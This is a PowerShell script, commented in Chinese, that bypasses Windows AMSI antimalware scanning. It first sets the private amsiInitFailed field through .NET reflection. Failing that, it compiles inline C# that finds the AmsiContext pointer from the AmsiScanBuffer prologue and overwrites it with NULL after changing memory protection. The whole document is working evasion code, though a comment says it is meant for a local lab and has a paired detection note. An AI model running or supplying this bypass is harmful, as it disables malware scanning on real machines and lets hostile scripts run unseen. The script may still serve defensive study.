# patchless AMSI（上下文破坏——不改 AmsiScanBuffer 任何代码字节）
# 三条路线按序尝试，任一路线成功即静默后续扫描：
#   R1 .NET 反射路线（PS5 + PS7 通用）：置 amsiInitFailed → AMSI 走初始化失败降级路径
#   R2 Win32 数据补丁路线（patchless 核心）：AmsiScanBuffer 前导 lea rcx,[rip+disp32]
#      反算 AmsiContext 指针地址 → 置 NULL（patch 的是上下文指针数据，非代码字节）
#   R3 COM 接口降级（兜底观察项）：记录 AmsiStream/反 Amsi provider 现状供判定
# 检测侧配对见 NOTES.md；仅本地实验环境使用
$ErrorActionPreference = 'SilentlyContinue'

# ── R1：.NET 反射置 amsiInitFailed（PS5 限定名 + PS7 当前域回退）──
function Invoke-AmsiDotNetRoute {
    $field = $null
    # PS5：限定程序集名
    $t = [Type]::GetType('System.Management.Automation.AmsiUtils, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35')
    if ($null -eq $t) {
        # PS7：类型随 S.M.A 在当前加载域，按程序集名检索（避开版本/公钥差异）
        $t = [System.AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.FullName -match 'System.Management.Automation' } |
            ForEach-Object { $_.GetType('System.Management.Automation.AmsiUtils') } |
            Where-Object { $_ } | Select-Object -First 1
    }
    if ($null -ne $t) {
        $field = $t.GetField('amsiInitFailed', [System.Reflection.BindingFlags]'Static,NonPublic')
        if ($null -ne $field) {
            $field.SetValue($null, $true)
            $after = $field.GetValue($null)
            if ($after) { return 'R1 amsiInitFailed=true（.NET 反射，PS5/PS7 通用域）' }
        }
    }
    return $null
}

# ── R2：Win32 AmsiContext 指针数据补丁（不 patch 代码字节）──
function Invoke-AmsiContextRoute {
    $src = @"
using System;
using System.Runtime.InteropServices;
public class AmsiCtx {
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint old);

    // AmsiScanBuffer 前导（x64）：48 8B C4(mov rax,rsp) 48 89 58 20(mov [rax+20],rbx) 56(push rsi)
    // 随后 48 8D 0D xx xx xx xx = lea rcx,[rip+disp32] → rcx 装载的即 AmsiContext 地址
    // （不同版本前导字节可能变化：本实现扫描 64 字节窗口内第一处 lea rcx,[rip]）
    public static string Corrupt() {
        IntPtr a = LoadLibrary("amsi.dll");
        if (a == IntPtr.Zero) return "R2 amsi.dll 未加载（宿主不扫描）";
        IntPtr scan = GetProcAddress(a, "AmsiScanBuffer");
        if (scan == IntPtr.Zero) return "R2 AmsiScanBuffer 未导出";
        byte[] code = new byte[64];
        Marshal.Copy(scan, code, 0, 64);
        for (int i = 0; i + 6 < 64; i++) {
            if (code[i] == 0x48 && code[i+1] == 0x8D && code[i+2] == 0x0D) {  // lea rcx,[rip+disp32]
                int disp = BitConverter.ToInt32(code, i + 3);
                long next = scan.ToInt64() + i + 7;
                IntPtr ctxPtr = new IntPtr(next + disp);                       // AmsiContext 变量地址
                uint old;
                if (!VirtualProtect(ctxPtr, (UIntPtr)8, 0x04, out old)) return "R2 protect 失败";
                for (int k = 0; k < 8; k++) Marshal.WriteByte(ctxPtr, k, 0);  // 置 NULL：扫描前校验失败即返
                VirtualProtect(ctxPtr, (UIntPtr)8, old, out old);
                // 回读验证（真实零值 ≠ 原值才算成功）
                long after = Marshal.ReadInt64(ctxPtr);
                return "R2 AmsiContext@" + ctxPtr.ToString("X") + "=NULL（回读 " + after + "）";
            }
        }
        return "R2 未定位 lea rcx,[rip]（版本前导变化，换 R1/记录 R3）";
    }
}
"@
    try { Add-Type -TypeDefinition $src } catch { return "R2 Add-Type 失败：$($_.Exception.Message)" }
    try { return [AmsiCtx]::Corrupt() } catch { return "R2 执行异常：$($_.Exception.Message)" }
}

# ── 主流程：R1 → R2 → R3，记录成功路线与降级观察 ──
$route = Invoke-AmsiDotNetRoute
if (-not $route) { $route = Invoke-AmsiContextRoute }
if (-not $route) { $route = 'R3 观察项：两条 patchless 路线均未命中（记录 PS 版本/amsi.dll 前导供判定）' }
Write-Output "[+] $route"

# 自测：后续脚本内容是否仍被执行（本地实验载荷：无害 echo）
Write-Output "[test] amsi still executing script: OK"
